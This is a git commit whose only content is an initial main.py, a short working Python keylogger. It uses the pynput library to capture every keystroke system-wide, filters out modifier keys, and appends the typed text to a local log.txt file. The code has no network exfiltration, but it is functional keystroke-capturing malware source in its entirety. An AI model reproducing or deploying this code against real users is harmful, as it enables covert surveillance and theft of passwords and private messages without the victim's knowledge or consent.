07dc7d34cfeb80916dd37b4f13db779ebe122053
adiichoudhary <127790319+adiichoudhary@users.noreply.github.com>
2023-07-23 12:53:29 +0530

    initial commit

---
+++ main.py
@@ -0,0 +1,28 @@
+from pynput.keyboard import Listener
+
+def writetofile(key):
+    letter = str(key)
+    letter = letter.replace("'","")
+    if letter == 'Key.space':
+        letter = ' '
+    if letter == 'Key.shift_r':
+        letter = ''
+    if letter == 'Key.shift':
+        letter = ''
+    if letter == 'Key.alt_r':
+        letter = ''
+    if letter == 'Key.alt_l':
+        letter = ''
+    if letter == 'Key.ctrl_r':
+        letter = ''
+    if letter == 'Key.ctrl_l':
+        letter = ''
+    if letter == 'Key.enter':
+        letter = '\n'
+    
+
+    with open("log.txt", 'a') as f:
+        f.write(letter)
+
+with Listener(on_press = writetofile) as l:
+    l.join()
